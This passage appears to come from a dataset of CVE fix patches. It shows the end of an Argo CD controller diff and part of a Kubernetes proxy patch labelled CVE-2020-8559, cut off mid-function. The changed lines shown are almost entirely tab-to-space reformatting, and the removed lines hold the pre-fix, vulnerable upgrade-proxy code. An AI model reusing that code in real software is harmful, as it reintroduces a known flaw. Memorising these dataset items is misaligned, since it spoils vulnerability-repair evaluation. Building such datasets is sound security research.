ctrl.applicationClientset.ArgoprojV1alpha1().Applications(watchNamespace).Watch(context.TODO(), options)\n+                        },\n+                },\n+                &appv1.Application{},\n+                refreshTimeout,\n+                cache.Indexers{\n+                        cache.NamespaceIndex: func(obj interface{}) ([]string, error) {\n+                                app, ok := obj.(*appv1.Application)\n+                                if ok {\n+                                        // This call to 'ValidateDestination' ensures that the .spec.destination field of all Applications\n+                                        // returned by the informer/lister will have server field set (if not already set) based on the name.\n+                                        // (or, if not found, an error app condition)\n+\n+                                        // If the server field is not set, set it based on the cluster name; if the cluster name can't be found,\n+                                        // log an error as an App Condition.\n+                                        if err := argo.ValidateDestination(context.Background(), &app.Spec.Destination, ctrl.db); err != nil {\n+                                                ctrl.setAppCondition(app, appv1.ApplicationCondition{Type: appv1.ApplicationConditionInvalidSpecError, Message: err.Error()})\n+                                        }\n+\n+                                        // If the application is not allowed to use the project,\n+                                        // log an error.\n+                                        if _, err := ctrl.getAppProj(app); err != nil {\n+                                                ctrl.setAppCondition(app, ctrl.projectErrorToCondition(err, app))\n+                                        }\n+                                }\n+\n+                                return cache.MetaNamespaceIndexFunc(obj)\n+                        },\n+                        orphanedIndex: func(obj interface{}) (i []string, e error) {\n+                                app, ok := obj.(*appv1.Application)\n+                                if !ok {\n+                                        return nil, nil\n+                                }\n+\n+                                proj, err := applisters.NewAppProjectLister(ctrl.projInformer.GetIndexer()).AppProjects(ctrl.namespace).Get(app.Spec.GetProject())\n+                                if err != nil {\n+                                        return nil, nil\n+                                }\n+                                if proj.Spec.OrphanedResources != nil {\n+                                        return []string{app.Spec.Destination.Namespace}, nil\n+                                }\n+                                return nil, nil\n+                        },\n+                },\n+        )\n+        lister := applisters.NewApplicationLister(informer.GetIndexer())\n+        informer.AddEventHandler(\n+                cache.ResourceEventHandlerFuncs{\n+                        AddFunc: func(obj interface{}) {\n+                                if !ctrl.canProcessApp(obj) {\n+                                        return\n+                                }\n+                                key, err := cache.MetaNamespaceKeyFunc(obj)\n+                                if err == nil {\n+                                        ctrl.appRefreshQueue.Add(key)\n+                                        ctrl.appOperationQueue.Add(key)\n+                                }\n+                        },\n+                        UpdateFunc: func(old, new interface{}) {\n+                                if !ctrl.canProcessApp(new) {\n+                                        return\n+                                }\n+\n+                                key, err := cache.MetaNamespaceKeyFunc(new)\n+                                if err != nil {\n+                                        return\n+                                }\n+                                var compareWith *CompareWith\n+                                oldApp, oldOK := old.(*appv1.Application)\n+                                newApp, newOK := new.(*appv1.Application)\n+                                if oldOK && newOK && automatedSyncEnabled(oldApp, newApp) {\n+                                        log.WithField(\"application\", newApp.QualifiedName()).Info(\"Enabled automated sync\")\n+                                        compareWith = CompareWithLatest.Pointer()\n+                                }\n+                                ctrl.requestAppRefresh(newApp.QualifiedName(), compareWith, nil)\n+                                ctrl.appOperationQueue.Add(key)\n+                        },\n+                        DeleteFunc: func(obj interface{}) {\n+                                if !ctrl.canProcessApp(obj) {\n+                                        return\n+                                }\n+                                // IndexerInformer uses a delta queue, therefore for deletes we have to use this\n+                                // key function.\n+                                key, err := cache.DeletionHandlingMetaNamespaceKeyFunc(obj)\n+                                if err == nil {\n+                                        ctrl.appRefreshQueue.Add(key)\n+                                }\n+                        },\n+                },\n+        )\n+        return informer, lister\n }\n \n func (ctrl *ApplicationController) projectErrorToCondition(err error, app *appv1.Application) appv1.ApplicationCondition {\n-\tvar condition appv1.ApplicationCondition\n-\tif apierr.IsNotFound(err) {\n-\t\tcondition = appv1.ApplicationCondition{\n-\t\t\tType:    appv1.ApplicationConditionInvalidSpecError,\n-\t\t\tMessage: fmt.Sprintf(\"Application referencing project %s which does not exist\", app.Spec.Project),\n-\t\t}\n-\t} else {\n-\t\tcondition = appv1.ApplicationCondition{Type: appv1.ApplicationConditionUnknownError, Message: err.Error()}\n-\t}\n-\treturn condition\n+        var condition appv1.ApplicationCondition\n+        if apierr.IsNotFound(err) {\n+                condition = appv1.ApplicationCondition{\n+                        Type:    appv1.ApplicationConditionInvalidSpecError,\n+                        Message: fmt.Sprintf(\"Application referencing project %s which does not exist\", app.Spec.Project),\n+                }\n+        } else {\n+                condition = appv1.ApplicationCondition{Type: appv1.ApplicationConditionUnknownError, Message: err.Error()}\n+        }\n+        return condition\n }\n \n func (ctrl *ApplicationController) RegisterClusterSecretUpdater(ctx context.Context) {\n-\tupdater := NewClusterInfoUpdater(ctrl.stateCache, ctrl.db, ctrl.appLister.Applications(\"\"), ctrl.cache, ctrl.clusterFilter, ctrl.getAppProj, ctrl.namespace)\n-\tgo updater.Run(ctx)\n+        updater := NewClusterInfoUpdater(ctrl.stateCache, ctrl.db, ctrl.appLister.Applications(\"\"), ctrl.cache, ctrl.clusterFilter, ctrl.getAppProj, ctrl.namespace)\n+        go updater.Run(ctx)\n }\n \n func isOperationInProgress(app *appv1.Application) bool {\n-\treturn app.Status.OperationState != nil && !app.Status.OperationState.Phase.Completed()\n+        return app.Status.OperationState != nil && !app.Status.OperationState.Phase.Completed()\n }\n \n // automatedSyncEnabled tests if an app went from auto-sync disabled to enabled.\n // if it was toggled to be enabled, the informer handler will force a refresh\n func automatedSyncEnabled(oldApp *appv1.Application, newApp *appv1.Application) bool {\n-\toldEnabled := false\n-\toldSelfHealEnabled := false\n-\tif oldApp.Spec.SyncPolicy != nil && oldApp.Spec.SyncPolicy.Automated != nil {\n-\t\toldEnabled = true\n-\t\toldSelfHealEnabled = oldApp.Spec.SyncPolicy.Automated.SelfHeal\n-\t}\n-\n-\tnewEnabled := false\n-\tnewSelfHealEnabled := false\n-\tif newApp.Spec.SyncPolicy != nil && newApp.Spec.SyncPolicy.Automated != nil {\n-\t\tnewEnabled = true\n-\t\tnewSelfHealEnabled = newApp.Spec.SyncPolicy.Automated.SelfHeal\n-\t}\n-\tif !oldEnabled && newEnabled {\n-\t\treturn true\n-\t}\n-\tif !oldSelfHealEnabled && newSelfHealEnabled {\n-\t\treturn true\n-\t}\n-\t// nothing changed\n-\treturn false\n+        oldEnabled := false\n+        oldSelfHealEnabled := false\n+        if oldApp.Spec.SyncPolicy != nil && oldApp.Spec.SyncPolicy.Automated != nil {\n+                oldEnabled = true\n+                oldSelfHealEnabled = oldApp.Spec.SyncPolicy.Automated.SelfHeal\n+        }\n+\n+        newEnabled := false\n+        newSelfHealEnabled := false\n+        if newApp.Spec.SyncPolicy != nil && newApp.Spec.SyncPolicy.Automated != nil {\n+                newEnabled = true\n+                newSelfHealEnabled = newApp.Spec.SyncPolicy.Automated.SelfHeal\n+        }\n+        if !oldEnabled && newEnabled {\n+                return true\n+        }\n+        if !oldSelfHealEnabled && newSelfHealEnabled {\n+                return true\n+        }\n+        // nothing changed\n+        return false\n }\n \n // toAppKey returns the application key from a given appName, that is, it will\n@@ -1966,15 +1966,15 @@ func automatedSyncEnabled(oldApp *appv1.Application, newApp *appv1.Application)\n // format. If the appName is an unqualified name (such as, \"app\"), it will use\n // the controller's namespace in the key.\n func (ctrl *ApplicationController) toAppKey(appName string) string {\n-\tif !strings.Contains(appName, \"_\") && !strings.Contains(appName, \"/\") {\n-\t\treturn ctrl.namespace + \"/\" + appName\n-\t} else if strings.Contains(appName, \"/\") {\n-\t\treturn appName\n-\t} else {\n-\t\treturn strings.ReplaceAll(appName, \"_\", \"/\")\n-\t}\n+        if !strings.Contains(appName, \"_\") && !strings.Contains(appName, \"/\") {\n+                return ctrl.namespace + \"/\" + appName\n+        } else if strings.Contains(appName, \"/\") {\n+                return appName\n+        } else {\n+                return strings.ReplaceAll(appName, \"_\", \"/\")\n+        }\n }\n \n func (ctrl *ApplicationController) toAppQualifiedName(appName, appNamespace string) string {\n-\treturn fmt.Sprintf(\"%s/%s\", appNamespace, appName)\n+        return fmt.Sprintf(\"%s/%s\", appNamespace, appName)\n }\n"}
{"cve":"CVE-2020-8559:0708", "fix_patch": "diff --git a/staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go b/staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go\nindex 17cbad90f74..529b1babbd6 100644\n--- a/staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go\n+++ b/staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go\n@@ -17,27 +17,27 @@ limitations under the License.\n package proxy\n \n import (\n-\t\"bufio\"\n-\t\"bytes\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"io/ioutil\"\n-\t\"log\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/http/httputil\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"k8s.io/apimachinery/pkg/api/errors\"\n-\t\"k8s.io/apimachinery/pkg/util/httpstream\"\n-\tutilnet \"k8s.io/apimachinery/pkg/util/net\"\n-\tutilruntime \"k8s.io/apimachinery/pkg/util/runtime\"\n-\n-\t\"github.com/mxk/go-flowrate/flowrate\"\n-\t\"k8s.io/klog/v2\"\n+        \"bufio\"\n+        \"bytes\"\n+        \"fmt\"\n+        \"io\"\n+        \"io/ioutil\"\n+        \"log\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/http/httputil\"\n+        \"net/url\"\n+        \"os\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"k8s.io/apimachinery/pkg/api/errors\"\n+        \"k8s.io/apimachinery/pkg/util/httpstream\"\n+        utilnet \"k8s.io/apimachinery/pkg/util/net\"\n+        utilruntime \"k8s.io/apimachinery/pkg/util/runtime\"\n+\n+        \"github.com/mxk/go-flowrate/flowrate\"\n+        \"k8s.io/klog/v2\"\n )\n \n // UpgradeRequestRoundTripper provides an additional method to decorate a request\n@@ -45,41 +45,41 @@ import (\n // an upgrade on the server. Any response will be handled by the intercepting\n // proxy.\n type UpgradeRequestRoundTripper interface {\n-\thttp.RoundTripper\n-\t// WrapRequest takes a valid HTTP request and returns a suitably altered version\n-\t// of request with any HTTP level values required to complete the request half of\n-\t// an upgrade on the server. It does not get a chance to see the response and\n-\t// should bypass any request side logic that expects to see the response.\n-\tWrapRequest(*http.Request) (*http.Request, error)\n+        http.RoundTripper\n+        // WrapRequest takes a valid HTTP request and returns a suitably altered version\n+        // of request with any HTTP level values required to complete the request half of\n+        // an upgrade on the server. It does not get a chance to see the response and\n+        // should bypass any request side logic that expects to see the response.\n+        WrapRequest(*http.Request) (*http.Request, error)\n }\n \n // UpgradeAwareHandler is a handler for proxy requests that may require an upgrade\n type UpgradeAwareHandler struct {\n-\t// UpgradeRequired will reject non-upgrade connections if true.\n-\tUpgradeRequired bool\n-\t// Location is the location of the upstream proxy. It is used as the location to Dial on the upstream server\n-\t// for upgrade requests unless UseRequestLocationOnUpgrade is true.\n-\tLocation *url.URL\n-\t// Transport provides an optional round tripper to use to proxy. If nil, the default proxy transport is used\n-\tTransport http.RoundTripper\n-\t// UpgradeTransport, if specified, will be used as the backend transport when upgrade requests are provided.\n-\t// This allows clients to disable HTTP/2.\n-\tUpgradeTransport UpgradeRequestRoundTripper\n-\t// WrapTransport indicates whether the provided Transport should be wrapped with default proxy transport behavior (URL rewriting, X-Forwarded-* header setting)\n-\tWrapTransport bool\n-\t// InterceptRedirects determines whether the proxy should sniff backend responses for redirects,\n-\t// following them as necessary.\n-\tInterceptRedirects bool\n-\t// RequireSameHostRedirects only allows redirects to the same host. It is only used if InterceptRedirects=true.\n-\tRequireSameHostRedirects bool\n-\t// UseRequestLocation will use the incoming request URL when talking to the backend server.\n-\tUseRequestLocation bool\n-\t// FlushInterval controls how often the standard HTTP proxy will flush content from the upstream.\n-\tFlushInterval time.Duration\n-\t// MaxBytesPerSec controls the maximum rate for an upstream connection. No rate is imposed if the value is zero.\n-\tMaxBytesPerSec int64\n-\t// Responder is passed errors that occur while setting up proxying.\n-\tResponder ErrorResponder\n+        // UpgradeRequired will reject non-upgrade connections if true.\n+        UpgradeRequired bool\n+        // Location is the location of the upstream proxy. It is used as the location to Dial on the upstream server\n+        // for upgrade requests unless UseRequestLocationOnUpgrade is true.\n+        Location *url.URL\n+        // Transport provides an optional round tripper to use to proxy. If nil, the default proxy transport is used\n+        Transport http.RoundTripper\n+        // UpgradeTransport, if specified, will be used as the backend transport when upgrade requests are provided.\n+        // This allows clients to disable HTTP/2.\n+        UpgradeTransport UpgradeRequestRoundTripper\n+        // WrapTransport indicates whether the provided Transport should be wrapped with default proxy transport behavior (URL rewriting, X-Forwarded-* header setting)\n+        WrapTransport bool\n+        // InterceptRedirects determines whether the proxy should sniff backend responses for redirects,\n+        // following them as necessary.\n+        InterceptRedirects bool\n+        // RequireSameHostRedirects only allows redirects to the same host. It is only used if InterceptRedirects=true.\n+        RequireSameHostRedirects bool\n+        // UseRequestLocation will use the incoming request URL when talking to the backend server.\n+        UseRequestLocation bool\n+        // FlushInterval controls how often the standard HTTP proxy will flush content from the upstream.\n+        FlushInterval time.Duration\n+        // MaxBytesPerSec controls the maximum rate for an upstream connection. No rate is imposed if the value is zero.\n+        MaxBytesPerSec int64\n+        // Responder is passed errors that occur while setting up proxying.\n+        Responder ErrorResponder\n }\n \n const defaultFlushInterval = 200 * time.Millisecond\n@@ -87,51 +87,51 @@ const defaultFlushInterval = 200 * time.Millisecond\n // ErrorResponder abstracts error reporting to the proxy handler to remove the need to hardcode a particular\n // error format.\n type ErrorResponder interface {\n-\tError(w http.ResponseWriter, req *http.Request, err error)\n+        Error(w http.ResponseWriter, req *http.Request, err error)\n }\n \n // SimpleErrorResponder is the legacy implementation of ErrorResponder for callers that only\n // service a single request/response per proxy.\n type SimpleErrorResponder interface {\n-\tError(err error)\n+        Error(err error)\n }\n \n func NewErrorResponder(r SimpleErrorResponder) ErrorResponder {\n-\treturn simpleResponder{r}\n+        return simpleResponder{r}\n }\n \n type simpleResponder struct {\n-\tresponder SimpleErrorResponder\n+        responder SimpleErrorResponder\n }\n \n func (r simpleResponder) Error(w http.ResponseWriter, req *http.Request, err error) {\n-\tr.responder.Error(err)\n+        r.responder.Error(err)\n }\n \n // upgradeRequestRoundTripper implements proxy.UpgradeRequestRoundTripper.\n type upgradeRequestRoundTripper struct {\n-\thttp.RoundTripper\n-\tupgrader http.RoundTripper\n+        http.RoundTripper\n+        upgrader http.RoundTripper\n }\n \n var (\n-\t_ UpgradeRequestRoundTripper  = &upgradeRequestRoundTripper{}\n-\t_ utilnet.RoundTripperWrapper = &upgradeRequestRoundTripper{}\n+        _ UpgradeRequestRoundTripper  = &upgradeRequestRoundTripper{}\n+        _ utilnet.RoundTripperWrapper = &upgradeRequestRoundTripper{}\n )\n \n // WrappedRoundTripper returns the round tripper that a caller would use.\n func (rt *upgradeRequestRoundTripper) WrappedRoundTripper() http.RoundTripper {\n-\treturn rt.RoundTripper\n+        return rt.RoundTripper\n }\n \n // WriteToRequest calls the nested upgrader and then copies the returned request\n // fields onto the passed request.\n func (rt *upgradeRequestRoundTripper) WrapRequest(req *http.Request) (*http.Request, error) {\n-\tresp, err := rt.upgrader.RoundTrip(req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn resp.Request, nil\n+        resp, err := rt.upgrader.RoundTrip(req)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return resp.Request, nil\n }\n \n // onewayRoundTripper captures the provided request - which is assumed to have\n@@ -140,12 +140,12 @@ type onewayRoundTripper struct{}\n \n // RoundTrip returns a simple 200 OK response that captures the provided request.\n func (onewayRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {\n-\treturn &http.Response{\n-\t\tStatus:     \"200 OK\",\n-\t\tStatusCode: http.StatusOK,\n-\t\tBody:       ioutil.NopCloser(&bytes.Buffer{}),\n-\t\tRequest:    req,\n-\t}, nil\n+        return &http.Response{\n+                Status:     \"200 OK\",\n+                StatusCode: http.StatusOK,\n+                Body:       ioutil.NopCloser(&bytes.Buffer{}),\n+                Request:    req,\n+        }, nil\n }\n \n // MirrorRequest is a round tripper that can be called to get back the calling request as\n@@ -156,325 +156,333 @@ var MirrorRequest http.RoundTripper = onewayRoundTripper{}\n // one that is able to write headers to an HTTP request. The request rt is used to set the request headers\n // and that is written to the underlying connection rt.\n func NewUpgradeRequestRoundTripper(connection, request http.RoundTripper) UpgradeRequestRoundTripper {\n-\treturn &upgradeRequestRoundTripper{\n-\t\tRoundTripper: connection,\n-\t\tupgrader:     request,\n-\t}\n+        return &upgradeRequestRoundTripper{\n+                RoundTripper: connection,\n+                upgrader:     request,\n+        }\n }\n \n // normalizeLocation returns the result of parsing the full URL, with scheme set to http if missing\n func normalizeLocation(location *url.URL) *url.URL {\n-\tnormalized, _ := url.Parse(location.String())\n-\tif len(normalized.Scheme) == 0 {\n-\t\tnormalized.Scheme = \"http\"\n-\t}\n-\treturn normalized\n+        normalized, _ := url.Parse(location.String())\n+        if len(normalized.Scheme) == 0 {\n+                normalized.Scheme = \"http\"\n+        }\n+        return normalized\n }\n \n // NewUpgradeAwareHandler creates a new proxy handler with a default flush interval. Responder is required for returning\n // errors to the caller.\n func NewUpgradeAwareHandler(location *url.URL, transport http.RoundTripper, wrapTransport, upgradeRequired bool, responder ErrorResponder) *UpgradeAwareHandler {\n-\treturn &UpgradeAwareHandler{\n-\t\tLocation:        normalizeLocation(location),\n-\t\tTransport:       transport,\n-\t\tWrapTransport:   wrapTransport,\n-\t\tUpgradeRequired: upgradeRequired,\n-\t\tFlushInterval:   defaultFlushInterval,\n-\t\tResponder:       responder,\n-\t}\n+        return &UpgradeAwareHandler{\n+                Location:        normalizeLocation(location),\n+                Transport:       transport,\n+                WrapTransport:   wrapTransport,\n+                UpgradeRequired: upgradeRequired,\n+                FlushInterval:   defaultFlushInterval,\n+                Responder:       responder,\n+        }\n }\n \n // ServeHTTP handles the proxy request\n func (h *UpgradeAwareHandler) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n-\tif h.tryUpgrade(w, req) {\n-\t\treturn\n-\t}\n-\tif h.UpgradeRequired {\n-\t\th.Responder.Error(w, req, errors.NewBadRequest(\"Upgrade request required\"))\n-\t\treturn\n-\t}\n-\n-\tloc := *h.Location\n-\tloc.RawQuery = req.URL.RawQuery\n-\n-\t// If original request URL ended in '/', append a '/' at the end of the\n-\t// of the proxy URL\n-\tif !strings.HasSuffix(loc.Path, \"/\") && strings.HasSuffix(req.URL.Path, \"/\") {\n-\t\tloc.Path += \"/\"\n-\t}\n-\n-\t// From pkg/genericapiserver/endpoints/handlers/proxy.go#ServeHTTP:\n-\t// Redirect requests with an empty path to a location that ends with a '/'\n-\t// This is essentially a hack for http://issue.k8s.io/4958.\n-\t// Note: Keep this code after tryUpgrade to not break that flow.\n-\tif len(loc.Path) == 0 {\n-\t\tvar queryPart string\n-\t\tif len(req.URL.RawQuery) > 0 {\n-\t\t\tqueryPart = \"?\" + req.URL.RawQuery\n-\t\t}\n-\t\tw.Header().Set(\"Location\", req.URL.Path+\"/\"+queryPart)\n-\t\tw.WriteHeader(http.StatusMovedPermanently)\n-\t\treturn\n-\t}\n-\n-\tif h.Transport == nil || h.WrapTransport {\n-\t\th.Transport = h.defaultProxyTransport(req.URL, h.Transport)\n-\t}\n-\n-\t// WithContext creates a shallow clone of the request with the same context.\n-\tnewReq := req.WithContext(req.Context())\n-\tnewReq.Header = utilnet.CloneHeader(req.Header)\n-\tif !h.UseRequestLocation {\n-\t\tnewReq.URL = &loc\n-\t}\n-\n-\tproxy := httputil.NewSingleHostReverseProxy(&url.URL{Scheme: h.Location.Scheme, Host: h.Location.Host})\n-\tproxy.Transport = h.Transport\n-\tproxy.FlushInterval = h.FlushInterval\n-\tproxy.ErrorLog = log.New(noSuppressPanicError{}, \"\", log.LstdFlags)\n-\tif h.Responder != nil {\n-\t\t// if an optional error interceptor/responder was provided wire it\n-\t\t// the custom responder might be used for providing a unified error reporting\n-\t\t// or supporting retry mechanisms by not sending non-fatal errors to the clients\n-\t\tproxy.ErrorHandler = h.Responder.Error\n-\t}\n-\tproxy.ServeHTTP(w, newReq)\n+        if h.tryUpgrade(w, req) {\n+                return\n+        }\n+        if h.UpgradeRequired {\n+                h.Responder.Error(w, req, errors.NewBadRequest(\"Upgrade request required\"))\n+                return\n+        }\n+\n+        loc := *h.Location\n+        loc.RawQuery = req.URL.RawQuery\n+\n+        // If original request URL ended in '/', append a '/' at the end of the\n+        // of the proxy URL\n+        if !strings.HasSuffix(loc.Path, \"/\") && strings.HasSuffix(req.URL.Path, \"/\") {\n+                loc.Path += \"/\"\n+        }\n+\n+        // From pkg/genericapiserver/endpoints/handlers/proxy.go#ServeHTTP:\n+        // Redirect requests with an empty path to a location that ends with a '/'\n+        // This is essentially a hack for http://issue.k8s.io/4958.\n+        // Note: Keep this code after tryUpgrade to not break that flow.\n+        if len(loc.Path) == 0 {\n+                var queryPart string\n+                if len(req.URL.RawQuery) > 0 {\n+                        queryPart = \"?\" + req.URL.RawQuery\n+                }\n+                w.Header().Set(\"Location\", req.URL.Path+\"/\"+queryPart)\n+                w.WriteHeader(http.StatusMovedPermanently)\n+                return\n+        }\n+\n+        if h.Transport == nil || h.WrapTransport {\n+                h.Transport = h.defaultProxyTransport(req.URL, h.Transport)\n+        }\n+\n+        // WithContext creates a shallow clone of the request with the same context.\n+        newReq := req.WithContext(req.Context())\n+        newReq.Header = utilnet.CloneHeader(req.Header)\n+        if !h.UseRequestLocation {\n+                newReq.URL = &loc\n+        }\n+\n+        proxy := httputil.NewSingleHostReverseProxy(&url.URL{Scheme: h.Location.Scheme, Host: h.Location.Host})\n+        proxy.Transport = h.Transport\n+        proxy.FlushInterval = h.FlushInterval\n+        proxy.ErrorLog = log.New(noSuppressPanicError{}, \"\", log.LstdFlags)\n+        if h.Responder != nil {\n+                // if an optional error interceptor/responder was provided wire it\n+                // the custom responder might be used for providing a unified error reporting\n+                // or supporting retry mechanisms by not sending non-fatal errors to the clients\n+                proxy.ErrorHandler = h.Responder.Error\n+        }\n+        proxy.ServeHTTP(w, newReq)\n }\n \n type noSuppressPanicError struct{}\n \n func (noSuppressPanicError) Write(p []byte) (n int, err error) {\n-\t// skip \"suppressing panic for copyResponse error in test; copy error\" error message\n-\t// that ends up in CI tests on each kube-apiserver termination as noise and\n-\t// everybody thinks this is fatal.\n-\tif strings.Contains(string(p), \"suppressing panic\") {\n-\t\treturn len(p), nil\n-\t}\n-\treturn os.Stderr.Write(p)\n+        // skip \"suppressing panic for copyResponse error in test; copy error\" error message\n+        // that ends up in CI tests on each kube-apiserver termination as noise and\n+        // everybody thinks this is fatal.\n+        if strings.Contains(string(p), \"suppressing panic\") {\n+                return len(p), nil\n+        }\n+        return os.Stderr.Write(p)\n }\n \n // tryUpgrade returns true if the request was handled.\n func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Request) bool {\n-\tif !httpstream.IsUpgradeRequest(req) {\n-\t\tklog.V(6).Infof(\"Request was not an upgrade\")\n-\t\treturn false\n-\t}\n-\n-\tvar (\n-\t\tbackendConn net.Conn\n-\t\trawResponse []byte\n-\t\terr         error\n-\t)\n-\n-\tlocation := *h.Location\n-\tif h.UseRequestLocation {\n-\t\tlocation = *req.URL\n-\t\tlocation.Scheme = h.Location.Scheme\n-\t\tlocation.Host = h.Location.Host\n-\t}\n-\n-\tclone := utilnet.CloneRequest(req)\n-\t// Only append X-Forwarded-For in the upgrade path, since httputil.NewSingleHostReverseProxy\n-\t// handles this in the non-upgrade path.\n-\tutilnet.AppendForwardedForHeader(clone)\n-\tif h.InterceptRedirects {\n-\t\tklog.V(6).Infof(\"Connecting to backend proxy (intercepting redirects) %s\\n  Headers: %v\", &location, clone.Header)\n-\t\tbackendConn, rawResponse, err = utilnet.ConnectWithRedirects(req.Method, &location, clone.Header, req.Body, utilnet.DialerFunc(h.DialForUpgrade), h.RequireSameHostRedirects)\n-\t} else {\n-\t\tklog.V(6).Infof(\"Connecting to backend proxy (direct dial) %s\\n  Headers: %v\", &location, clone.Header)\n-\t\tclone.URL = &location\n-\t\tbackendConn, err = h.DialForUpgrade(clone)\n-\t}\n-\tif err != nil {\n-\t\tklog.V(6).Infof(\"Proxy connection error: %v\", err)\n-\t\th.Responder.Error(w, req, err)\n-\t\treturn true\n-\t}\n-\tdefer backendConn.Close()\n-\n-\t// determine the http response code from the backend by reading from rawResponse+backendConn\n-\tbackendHTTPResponse, headerBytes, err := getResponse(io.MultiReader(bytes.NewReader(rawResponse), backendConn))\n-\tif err != nil {\n-\t\tklog.V(6).Infof(\"Proxy connection error: %v\", err)\n-\t\th.Responder.Error(w, req, err)\n-\t\treturn true\n-\t}\n-\tif len(headerBytes) > len(rawResponse) {\n-\t\t// we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend\n-\t\trawResponse = headerBytes\n-\t}\n-\n-\t// Once the connection is hijacked, the ErrorResponder will no longer work, so\n-\t// hijacking should be the last step in the upgrade.\n-\trequestHijacker, ok := w.(http.Hijacker)\n-\tif !ok {\n-\t\tklog.V(6).Infof(\"Unable to hijack response writer: %T\", w)\n-\t\th.Responder.Error(w, req, fmt.Errorf(\"request connection cannot be hijacked: %T\", w))\n-\t\treturn true\n-\t}\n-\trequestHijackedConn, _, err := requestHijacker.Hijack()\n-\tif err != nil {\n-\t\tklog.V(6).Infof(\"Unable to hijack response: %v\", err)\n-\t\th.Responder.Error(w, req, fmt.Errorf(\"error hijacking connection: %v\", err))\n-\t\treturn true\n-\t}\n-\tdefer requestHijackedConn.Close()\n-\n-\tif backendHTTPResponse.StatusCode != http.StatusSwitchingProtocols {\n-\t\t// If the backend did not upgrade the request, echo the response from the backend to the client and return, closing the connection.\n-\t\tklog.V(6).Infof(\"Proxy upgrade error, status code %d\", backendHTTPResponse.StatusCode)\n-\t\t// set read/write deadlines\n-\t\tdeadline := time.Now().Add(10 * time.Second)\n-\t\tbackendConn.SetReadDeadline(deadline)\n-\t\trequestHijackedConn.SetWriteDeadline(deadline)\n-\t\t// write the response to the client\n-\t\terr := backendHTTPResponse.Write(requestHijackedConn)\n-\t\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n-\t\t\tklog.Errorf(\"Error proxying data from backend to client: %v\", err)\n-\t\t}\n-\t\t// Indicate we handled the request\n-\t\treturn true\n-\t}\n-\n-\t// Forward raw response bytes back to client.\n-\tif len(rawResponse) > 0 {\n-\t\tklog.V(6).Infof(\"Writing %d bytes to hijacked connection\", len(rawResponse))\n-\t\tif _, err = requestHijackedConn.Write(rawResponse); err != nil {\n-\t\t\tutilruntime.HandleError(fmt.Errorf(\"Error proxying response from backend to client: %v\", err))\n-\t\t}\n-\t}\n-\n-\t// Proxy the connection. This is bidirectional, so we need a goroutine\n-\t// to copy in each direction. Once one side of the connection exits, we\n-\t// exit the function which performs cleanup and in the process closes\n-\t// the other half of the connection in the defer.\n-\twriterComplete := make(chan struct{})\n-\treaderComplete := make(chan struct{})\n-\n-\tgo func() {\n-\t\tvar writer io.WriteCloser\n-\t\tif h.MaxBytesPerSec > 0 {\n-\t\t\twriter = flowrate.NewWriter(backendConn, h.MaxBytesPerSec)\n-\t\t} else {\n-\t\t\twriter = backendConn\n-\t\t}\n-\t\t_, err := io.Copy(writer, requestHijackedConn)\n-\t\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n-\t\t\tklog.Errorf(\"Error proxying data from client to backend: %v\", err)\n-\t\t}\n-\t\tclose(writerComplete)\n-\t}()\n-\n-\tgo func() {\n-\t\tvar reader io.ReadCloser\n-\t\tif h.MaxBytesPerSec > 0 {\n-\t\t\treader = flowrate.NewReader(backendConn, h.MaxBytesPerSec)\n-\t\t} else {\n-\t\t\treader = backendConn\n-\t\t}\n-\t\t_, err := io.Copy(requestHijackedConn, reader)\n-\t\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n-\t\t\tklog.Errorf(\"Error proxying data from backend to client: %v\", err)\n-\t\t}\n-\t\tclose(readerComplete)\n-\t}()\n-\n-\t// Wait for one half the connection to exit. Once it does the defer will\n-\t// clean up the other half of the connection.\n-\tselect {\n-\tcase <-writerComplete:\n-\tcase <-readerComplete:\n-\t}\n-\tklog.V(6).Infof(\"Disconnecting from backend proxy %s\\n  Headers: %v\", &location, clone.Header)\n-\n-\treturn true\n+        if !httpstream.IsUpgradeRequest(req) {\n+                klog.V(6).Infof(\"Request was not an upgrade\")\n+                return false\n+        }\n+\n+        var (\n+                backendConn net.Conn\n+                rawResponse []byte\n+                err         error\n+        )\n+\n+        location := *h.Location\n+        if h.UseRequestLocation {\n+                location = *req.URL\n+                location.Scheme = h.Location.Scheme\n+                location.Host = h.Location.Host\n+        }\n+\n+        clone := utilnet.CloneRequest(req)\n+        // Only append X-Forwarded-For in the upgrade path, since httputil.NewSingleHostReverseProxy\n+        // handles this in the non-upgrade path.\n+        utilnet.AppendForwardedForHeader(clone)\n+        if h.InterceptRedirects {\n+                klog.V(6).Infof(\"Connecting to backend proxy (intercepting redirects) %s\\n  Headers: %v\", &location, clone.Header)\n+                backendConn, rawResponse, err = utilnet.ConnectWithRedirects(req.Method, &location, clone.Header, req.Body, utilnet.DialerFunc(h.DialForUpgrade), h.RequireSameHostRedirects)\n+        } else {\n+                klog.V(6).Infof(\"Connecting to backend proxy (direct dial) %s\\n  Headers: %v\", &location, clone.Header)\n+                clone.URL = &location\n+                backendConn, err = h.DialForUpgrade(clone)\n+        }\n+        if err != nil {\n+                klog.V(6).Infof(\"Proxy connection error: %v\", err)\n+                h.Responder.Error(w, req, err)\n+                return true\n+        }\n+        defer backendConn.Close()\n+\n+        // determine the http response code from the backend by reading from rawResponse+backendConn\n+        backendHTTPResponse, headerBytes, err := getResponse(io.MultiReader(bytes.NewReader(rawResponse), backendConn))\n+        if err != nil {\n+                klog.V(6).Infof(\"Proxy connection error: %v\", err)\n+                h.Responder.Error(w, req, err)\n+                return true\n+        